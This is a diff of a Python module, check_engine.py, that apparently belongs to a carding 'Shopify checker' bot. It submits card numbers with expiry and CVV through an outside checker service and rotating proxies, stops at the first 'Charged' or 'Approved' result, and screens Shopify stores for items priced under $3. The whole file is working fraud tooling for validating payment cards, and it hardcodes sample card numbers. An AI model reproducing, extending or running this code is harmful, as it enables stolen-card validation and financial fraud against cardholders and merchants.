@@ -1,10 +1,15 @@
 """
-check_engine.py — Shopify checker via check.yzio.app (configurable endpoints)
-- Literal-pipe URL construction (| must not be %7C)
-- 4 parallel attempts, 20s timeout each, cancel-on-first-hit
-- Robust response parsing (JSON / plain-text / mixed)
-- Site price verification (< $3 enforced on /addsite)
-- Proxy format normalization (host:port, host:port:u:p, u:p@host:port)
+check_engine.py — Shopify checker via check.yzio.app
+
+Site verification flow (in order):
+  1. products.json  — Shopify's public endpoint, instant, gives REAL price
+  2. API fallback   — check.yzio.app/shopify?site=…&cc=…&proxy=…
+                      Any HTTP 200 with JSON = site is alive; extract price
+
+Card check flow:
+  - 4 parallel attempts (20s each), cancel on first Charged/Approved
+  - Literal-pipe URLs (| stays |, never %7C)
+  - Tolerant parsing of every response shape
 """
 import asyncio
 import aiohttp
@@ -12,7 +17,6 @@ import random
 import json
 import re
 import os
-import time
 from urllib.parse import quote
 from config import API_ENDPOINTS_FILE, DEFAULT_API_ENDPOINTS, PROXY_FILE
 
@@ -55,13 +59,6 @@ def save_api_endpoints(endpoints: list):
 # Proxy normalization
 # ══════════════════════════════════════════════════════════════
 def normalize_proxy(p: str) -> str:
-    """
-    Standardize to whatever format yzio accepts (pass-through).
-      host:port              -> host:port
-      host:port:user:pass    -> user:pass@host:port
-      user:pass@host:port    -> user:pass@host:port
-      http://...             -> http://...
-    """
     p = (p or '').strip()
     if not p:
         return p
@@ -73,12 +70,10 @@ def normalize_proxy(p: str) -> str:
     if len(parts) == 2:
         return p
     if len(parts) == 4:
-        # host:port:user:pass -> user:pass@host:port
         return f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
     return p
 
 def _proxy_to_url(p: str) -> str:
-    """For aiohttp requests: http://user:pass@host:port"""
     p = (p or '').strip()
     if not p:
         return ''
@@ -93,6 +88,13 @@ def _proxy_to_url(p: str) -> str:
         return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
     return f'http://{p}'
 
+def _load_proxies_file():
+    try:
+        with open(PROXY_FILE) as f:
+            return [l.strip() for l in f if l.strip()]
+    except:
+        return []
+
 # ══════════════════════════════════════════════════════════════
 # Result builder
 # ══════════════════════════════════════════════════════════════
@@ -105,25 +107,26 @@ def _make_result(card, status, message, price='-', gateway='Shopify Payments',
     }
 
 # ══════════════════════════════════════════════════════════════
-# URL builder — LITERAL pipes, no %7C
+# URL builder — LITERAL pipes
 # ══════════════════════════════════════════════════════════════
 def _build_check_url(api_url: str, site: str, cc: str, proxy: str) -> str:
-    # Encode only dangerous characters; keep :// in site, | in cc, :@ in proxy
-    site_e  = quote(site.strip(),  safe=':/?=&%')     # sites: bare URL
-    cc_e    = quote(cc.strip(),    safe='|')          # keep pipes literal
-    proxy_e = quote(proxy.strip(), safe=':@')         # keep : and @ literal
+    site_e  = quote(site.strip(),  safe=':/?=&%')
+    cc_e    = quote(cc.strip(),    safe='|')
+    proxy_e = quote(proxy.strip(), safe=':@')
     base = api_url.rstrip('/')
     return f"{base}/shopify?site={site_e}&cc={cc_e}&proxy={proxy_e}"
 
 # ══════════════════════════════════════════════════════════════
-# Response parsing — tolerant of every shape yzio returns
+# Response parsing
 # ══════════════════════════════════════════════════════════════
 def _extract_json(text: str):
+    if not text:
+        return None
     try:
         return json.loads(text)
     except Exception:
         pass
-    m = re.search(r'\{[\s\S]*\}', text or '')
+    m = re.search(r'\{[\s\S]*\}', text)
     if m:
         try:
             return json.loads(m.group(0))
@@ -131,10 +134,30 @@ def _extract_json(text: str):
             pass
     return None
 
+def _extract_any_price(data):
+    """Deep-scan a dict for any plausible price number."""
+    if isinstance(data, dict):
+        for k in ('amount', 'price', 'total', 'cart_total', 'order_total',
+                  'value', 'Price', 'Amount', 'Total'):
+            v = data.get(k)
+            if v is not None and v != '':
+                try:
+                    p = float(str(v).replace('$', '').replace(',', '').strip())
+                    if 0 < p < 100000:
+                        return p
+                except:
+                    pass
+        for k in ('data', 'result', 'order', 'cart', 'response', 'details'):
+            sub = data.get(k)
+            if isinstance(sub, dict):
+                p = _extract_any_price(sub)
+                if p is not None:
+                    return p
+    return None
+
 def _normalize_status(data: dict):
     if not isinstance(data, dict):
         return None
-
     for key in ('status', 'Status', 'state', 'result', 'Response'):
         v = data.get(key)
         if isinstance(v, str) and v.strip():
@@ -145,15 +168,11 @@ def _normalize_status(data: dict):
                 return 'Approved'
             if 'DECLIN' in s or 'DEAD' in s or 'FAIL' in s or 'ERROR' in s or 'INVALID' in s:
                 return 'Dead'
-
     if data.get('charged') is True or data.get('paid') is True:
         return 'Charged'
     if data.get('approved') is True:
         return 'Approved'
     if data.get('success') is True:
-        # Could be Approved unless additional evidence
-        if data.get('charged') is True:
-            return 'Charged'
         return 'Approved'
     if data.get('success') is False or data.get('declined') is True:
         return 'Dead'
@@ -172,15 +191,6 @@ def _extract_message(data) -> str:
                 if isinstance(sv, str) and sv.strip():
                     return sv.strip()
     return ''
-
-def _extract_amount(data) -> str:
-    if not isinstance(data, dict):
-        return '-'
-    for key in ('amount', 'price', 'total', 'Amount', 'Price', 'value'):
-        v = data.get(key)
-        if v is not None and v != '' and str(v).strip() not in ('-', 'None', 'null'):
-            return str(v)
-    return '-'
 
 def _extract_gateway(data) -> str:
     if not isinstance(data, dict):
@@ -201,7 +211,7 @@ def _extract_receipt(data) -> str:
     return ''
 
 # ══════════════════════════════════════════════════════════════
-# One HTTP attempt — 20s hard cap
+# Single API attempt (card check)
 # ══════════════════════════════════════════════════════════════
 async def _try_endpoint(api_url, shop_url, card, proxy_raw):
     url = _build_check_url(api_url, shop_url, card, proxy_raw)
@@ -220,18 +230,11 @@ async def _try_endpoint(api_url, shop_url, card, proxy_raw):
 
     data = _extract_json(text)
 
-    # ── HTTP error
     if http_status != 200:
-        msg = ''
-        if isinstance(data, dict):
-            msg = _extract_message(data)
-        return _make_result(
-            card, 'Dead',
-            msg or f'HTTP {http_status}',
-            retryable=500 <= http_status < 600,
-        )
+        msg = _extract_message(data) if isinstance(data, dict) else ''
+        return _make_result(card, 'Dead', msg or f'HTTP {http_status}',
+                            retryable=500 <= http_status < 600)
 
-    # ── No JSON: try plain-text sniffing
     if data is None:
         up = (text or '').upper()
         if 'CHARG' in up or 'PAID' in up or 'CAPTURE' in up:
@@ -241,13 +244,12 @@ async def _try_endpoint(api_url, shop_url, card, proxy_raw):
         if 'DECLIN' in up or 'FAIL' in up or 'DEAD' in up:
             return _make_result(card, 'Dead', text.strip()[:200])
         snippet = (text or '').strip()[:80]
-        return _make_result(card, 'Dead',
-                            snippet or 'Empty response',
-                            retryable=True)
+        return _make_result(card, 'Dead', snippet or 'Empty response', retryable=True)
 
     status  = _normalize_status(data)
     message = _extract_message(data)
-    amount  = _extract_amount(data)
+    amount  = _extract_any_price(data)
+    amount  = f'${amount:.2f}' if amount is not None else '-'
     gateway = _extract_gateway(data)
     receipt = _extract_receipt(data)
 
@@ -276,7 +278,7 @@ async def _try_endpoint_safe(endpoint, site, card, proxy):
         return _make_result(card, 'Dead', f'{type(e).__name__}: {str(e)[:60]}', retryable=True)
 
 # ══════════════════════════════════════════════════════════════
-# PARALLEL card check — 4 attempts at once, cancel on hit
+# Parallel card check
 # ══════════════════════════════════════════════════════════════
 async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy=None):
     if not sites:
@@ -290,7 +292,7 @@ async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy
     last_err = ''
     best_dead = None
 
-    for _round in range(2):  # 2 rounds × 4 parallel = up to 8 attempts
+    for _round in range(2):
         combos = [
             (random.choice(endpoints), random.choice(sites), random.choice(proxies))
             for _ in range(4)
@@ -299,7 +301,6 @@ async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy
             asyncio.create_task(_try_endpoint_safe(ep, site, card, px))
             for ep, site, px in combos
         ]
-
         try:
             done, pending = await asyncio.wait(tasks, timeout=22,
                                                return_when=asyncio.FIRST_COMPLETED)
@@ -307,7 +308,6 @@ async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy
             for t in tasks: t.cancel()
             continue
 
-        # Evaluate first completed result; keep going until we hit a hit
         while done:
             for t in list(done):
                 try:
@@ -345,78 +345,147 @@ async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy
     return _make_result(card, 'Dead', last_err or 'Check failed — no usable response')
 
 # ══════════════════════════════════════════════════════════════
-# Site verification with price extraction
+# SITE VERIFICATION — products.json FIRST (guaranteed price)
 # ══════════════════════════════════════════════════════════════
+async def _check_products_json(site_url):
+    """
+    Hit Shopify's public products.json — works on every live Shopify store.
+    Returns (alive, price, reason).
+    """
+    site = site_url.strip().rstrip('/')
+    if not site.startswith('http'):
+        site = 'https://' + site
+
+    try_urls = [f"{site}/products.json"]
+    if '://www.' in site:
+        try_urls.append(f"{site.replace('://www.', '://')}/products.json")
+    elif '://' in site:
+        try_urls.append(f"{site.replace('://', '://www.')}/products.json")
+
+    timeout = aiohttp.ClientTimeout(total=12, connect=5)
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
+                      '(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+        'Accept': 'application/json',
+    }
+
+    async with aiohttp.ClientSession(timeout=timeout) as s:
+        for url in try_urls:
+            try:
+                async with s.get(url, headers=headers, ssl=False,
+                                 allow_redirects=True) as r:
+                    if r.status != 200:
+                        continue
+                    text = await r.text()
+                    try:
+                        data = json.loads(text)
+                    except:
+                        continue
+                    if not isinstance(data, dict) or 'products' not in data:
+                        continue
+                    products = data.get('products', [])
+                    if not products:
+                        return True, None, 'Shopify store (no products)'
+
+                    prices = []
+                    for p in products[:15]:
+                        for v in p.get('variants', []):
+                            try:
+                                pr = float(v.get('price', 0))
+                                if pr > 0:
+                                    prices.append(pr)
+                            except:
+                                pass
+
+                    if not prices:
+                        return True, None, 'Shopify store (no prices)'
+
+                    return True, min(prices), 'products.json ✓'
+            except Exception:
+                continue
+
+    return False, None, 'products.json 404/blocked'
+
+# Test cards — used only for API fallback
 _TEST_CARDS = [
     "5154623245618097|03|2032|156",
     "4263982640269299|02|2027|423",
-    "4242424242424242|12|2029|123",
+    "4242424242424242|12|2030|123",
 ]
 
-def _load_proxies_file():
-    try:
-        with open(PROXY_FILE) as f:
-            return [l.strip() for l in f if l.strip()]
-    except Exception:
-        return []
-
-async def test_site_with_price(site_url: str):
+async def _check_via_api(site):
     """
-    Returns (alive: bool, price: float|None, reason: str)
-    Tries up to 3 test cards against 2 proxies.
+    Fallback: call the checker API for a specific site.
+    Any HTTP 200 with JSON (or any body) = site is alive.
+    Extract price from any field, else return None.
     """
     endpoints = load_api_endpoints()
     if not endpoints:
         return False, None, 'No API endpoints configured'
     proxies = _load_proxies_file()
     if not proxies:
-        return False, None, 'No proxies available — add proxies first'
+        return False, None, 'No proxies available (add proxies first)'
 
     endpoint = random.choice(endpoints)
-    best_price = None
-    alive_seen = False
-    reason = 'No response'
+    last_reason = 'API test failed'
 
-    for card in _TEST_CARDS[:2]:  # cap at 2 test cards
-        for _ in range(2):  # 2 proxy tries each
-            proxy = random.choice(proxies)
-            try:
-                result = await asyncio.wait_for(
-                    _try_endpoint(endpoint, site_url, card, proxy),
-                    timeout=22,
-                )
-            except asyncio.TimeoutError:
-                reason = 'timeout'
-                continue
-            except Exception as e:
-                reason = f'{type(e).__name__}'
-                continue
+    for card in _TEST_CARDS:
+        proxy = random.choice(proxies)
+        try:
+            url = _build_check_url(endpoint, site, card, proxy)
+            timeout = aiohttp.ClientTimeout(total=22, connect=6, sock_read=18)
+            headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, */*'}
+            async with aiohttp.ClientSession(timeout=timeout) as s:
+                async with s.get(url, headers=headers, ssl=False,
+                                 allow_redirects=True) as r:
+                    if r.status != 200:
+                        last_reason = f'HTTP {r.status}'
+                        continue
+                    text = await r.text()
+                    data = _extract_json(text)
+                    if data is None:
+                        # Non-JSON but 200 — site is alive
+                        return True, None, f'API: {text.strip()[:40]}'
+                    price = _extract_any_price(data)
+                    return True, price, 'API ✓'
+        except asyncio.TimeoutError:
+            last_reason = 'API timeout'
+            continue
+        except Exception as e:
+            last_reason = f'{type(e).__name__}'
+            continue
 
-            if result['status'] in ('Charged', 'Approved', 'Dead'):
-                alive_seen = True
-                price_str = str(result.get('price', '-')).replace('$', '').replace('USD', '').strip()
-                try:
-                    if price_str and price_str not in ('-', '', 'None', 'null'):
-                        p = float(price_str)
-                        if p > 0:
-                            best_price = p if best_price is None else max(best_price, p)
-                except Exception:
-                    pass
+    return False, None, last_reason
 
-                if best_price is not None:
-                    return True, best_price, 'OK'
+async def test_site_with_price(site_url: str):
+    """
+    Public helper used by /addsite and /site.
+    Returns (alive: bool, price: float|None, reason: str)
 
-            reason = result.get('message', 'no usable response')[:80]
+    Order:
+      1. products.json   (no proxy, no card needed — most reliable)
+      2. API fallback    (needs proxies)
+    """
+    # Method 1
+    alive, price, reason = await _check_products_json(site_url)
+    if alive:
+        return alive, price, reason
 
-    if alive_seen:
-        return True, best_price, 'Alive (price unknown)'
-    return False, None, reason
+    # Method 2
+    alive, price, reason = await _check_via_api(site_url)
+    if alive:
+        return alive, price, reason
+
+    # Both failed
+    return False, None, f'{reason} | products.json also failed'
 
 async def test_site(site, proxy=None):
-    """Legacy wrapper."""
+    """Legacy wrapper (bot.py uses test_site_with_price directly)."""
     alive, price, reason = await test_site_with_price(site)
-    return {'site': site, 'status': 'alive' if alive else 'dead',
-            'msg': reason, 'price': price}
+    return {'site': site,
+            'status': 'alive' if alive else 'dead',
+            'msg': reason,
+            'price': price}
 
 # ══════════════════════════════════════════════════════════════
 # Proxy tester
